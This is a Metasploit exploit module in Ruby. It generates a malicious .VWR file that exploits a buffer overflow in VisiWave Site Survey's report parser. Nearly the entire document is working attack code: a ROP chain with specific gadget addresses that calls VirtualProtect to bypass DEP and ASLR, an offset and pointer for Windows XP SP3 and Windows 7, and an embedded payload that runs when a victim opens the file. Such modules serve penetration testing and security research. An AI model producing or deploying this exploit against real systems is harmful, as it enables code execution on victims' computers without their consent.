##
# $Id: visiwave_vwr_type.rb 12706 2011-05-24 23:15:06Z sinn3r $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'VisiWave VWR File Parsing Buffer Overflow',
			'Description'    => %q{
				This module exploits a vulnerability found in VisiWave's Site Survey Report application.
				When processing .VWR files, VisiWave.exe attempts to match a valid pointer based on the 'Type'
				property (valid ones include 'Properties', 'TitlePage', 'Details', 'Graph', 'Table', 'Text',
				'Image'), but if a match isn't found, the function that's supposed to handle this routine
				ends up returning the input as a pointer, and later used in a CALL DWORD PTR [EDX+10]
				instruction.  This allows attackers to overwrite it with any arbitrary value, and results code
				execution.  This module was built to bypass ASLR and DEP.

				NOTE: During installation, the application will register two file handle's, VWS and VWR and allows a
				victim user to 'double click' the malicious VWR file and execute code.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'mr_me',  # original discovery & msf exploit
					'TecR0c'  # msf exploit
				],
			'Version'        => '$Revision: 12706 $',
			'References'     =>
				[
					[ 'OSVDB', '72464'],
					[ 'URL', 'http://www.visiwave.com/blog/index.php?/archives/4-Version-2.1.9-Released.html' ]
				],
			'Payload'        =>
				{
					'Space'       => 2000,
					'BadChars'    => "\x00\x0a\x0d",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[
						'Windows XP SP3/Windows 7 SP0',
						{
							'Offset' => 3981,         # offset to rop gadgets
							'Pointer' => 0x007AF938,  # POP R32; POP R32; POP R32; ADD ESP 50; RETN ("magic" pointer)
						}
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'May 10 2011',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'msf.vwr']),
			], self.class)
	end

	def exploit

		# Allowing nulls in our rop chain is like giving gold to midas.
		# instructions taken from the applications non aslr modules
		# libcurl.dll, VisiWaveReport.exe and blah blah
		rop_gadgets =
		[
			0x1001AFBD,  # INC EBP; PUSH ESP; POP EDI; POP ESI; POP EBP; POP EBX; RET
			0xc0fff333,  # junk
			0xc0fff333,  # junk
			0x000004cf,  # lwSize 1231 bytes
			0x100017DD,  # POP ECX; RETN
			0x10037a60,  # Writeable address from .data of libcurl.dll
			0x10011104,  # POP EDX; RETN
			0x00000040,  # RWX for VirtualProtect()
			0x10026E4D,  # MOV EAX,EDI # POP EDI # RETN 
			0x10002ac6,  # RETN
			0x10022641,  # ADD EAX, 20; RETN
			0x10022641,  # ADD EAX, 20; RETN
			0x10022641,  # ADD EAX, 20; RETN
			0x10022641,  # ADD EAX, 20; RETN
			0x10022641,  # ADD EAX, 20; RETN
			0x10022641,  # ADD EAX, 20; RETN
			0x004048B1,  # XCHG EAX,EBP
			0x1001BD3F,  # POP EAX; RETN
			0x10032048,  # IAT Address - constant pointer to VirtualProtect()
			0x1000FA4A,  # MOV EAX,DWORD PTR DS:[EAX]; RETN
			0x00657fd7,  # XCHG EAX,ESI; RETN
			0x1000af40,  # PUSHAD; RET
		].pack("V*")

		# grab the pointer to our buffer
		pointer = [target["Pointer"]].pack("V")

		sploit = pointer  # begin life in EDX
		sploit << rand_text_alphanumeric(target["Offset"])  # massive offset
		sploit << rop_gadgets      # rop chain
		sploit << make_nops(300)   # safe landing
		sploit << payload.encoded  # profit!

		vwr_data = "FileType: SSREPORT\r\n"
		vwr_data << "Product: VisiWave Site Survey, 1.6.5 Beta\r\n"
		vwr_data << "FileVersion: 10\r\n"
		vwr_data << "Item: Global Properties\r\n"
		vwr_data << "Checked: 1\r\n"
		vwr_data << "Type: #{sploit}\r\n"
		vwr_data << "SurveyFile: C:\Program Files\VisiWave Site Survey\Samples\SampleData.vws\r\n"
		vwr_data << "FloorPlanImageReport: C:\WINDOWS\Web\bullet.gif\r\n"
		vwr_data << "DefaultOrientation: 0\r\n"
		vwr_data << "Header:\r\n"
		vwr_data << "Footer:\r\n"
		vwr_data << "LeftMargin: 100\r\n"
		vwr_data << "RightMargin: 100\r\n"
		vwr_data << "TopMargin: 50\r\n"
		vwr_data << "BottomMargin: 50\r\n"
		vwr_data << "Item: lol\r\n"
		vwr_data << "Checked: 1\r\n"

		print_status("Creating '#{datastore['FILENAME']}'...")
		file_create(vwr_data)
	end

end

